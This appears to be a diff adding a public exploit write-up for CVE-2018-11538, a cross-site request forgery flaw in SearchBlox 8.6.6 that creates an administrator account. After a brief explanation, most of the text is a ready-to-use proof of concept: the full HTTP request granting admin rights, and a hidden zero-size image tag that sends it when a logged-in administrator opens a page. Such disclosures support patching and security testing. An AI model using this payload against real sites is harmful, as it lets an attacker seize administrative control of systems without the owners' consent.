@@ -1,0 +1,48 @@
+# Exploit Title: CSRF Privilege Escalation (Creation of an administrator
+account) on SearchBlox 8.6.6
+# Exploit Author: Canberk BOLAT, Ahmet GÜREL
+# Software Link: https://www.searchblox.com/
+# Version: < = SearchBlox Version 8.6.6
+# Platform: Java
+# Tested on: Windows
+# CVE: CVE-2018-11538
+
+# 1. DETAILS
+
+Using Cross-Site Request Forgery (CSRF), an attacker can force a user who
+is currently authenticated with a web application to execute an unwanted
+action. The attacker can trick the user into loading a page which may send
+a request to perform the unwanted action in the background. In the case of
+Searchblox, we can use CSRF to perform actions on the admin dashboard by
+targeting an administrator.
+
+# 2. PoC:
+
+We assume that Searchblox is installed at http://localhost:8080/. Our
+target is /searchblox/servlet/UserServlet u_name, u_passwd1, u_passwd2 and
+role parameter which is the page used to create a new user. The given POC
+will create a user on the website which has full administrator privileges.
+
+HTTP Request:
+
+GET
+/searchblox/servlet/UserServlet?u_name=best1&u_passwd1=test&u_passwd2=test&role=admin&new-group=&menu1=adm&menu2=db&action=addBuisnessUser
+HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0)
+Gecko/20100101 Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8080/searchblox/admin/main.jsp?menu1=adm
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Cookie: JSESSIONID=touluja8tpjc1iiwquoyiigfi;
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Attack Vector:
+
+<img src="
+http://target:8080/searchblox/servlet/UserServlet?u_name=best1&u_passwd1=test&u_passwd2=test&role=admin&new-group=&menu1=adm&menu2=db&action=addBuisnessUser"
+width="0" height="0">
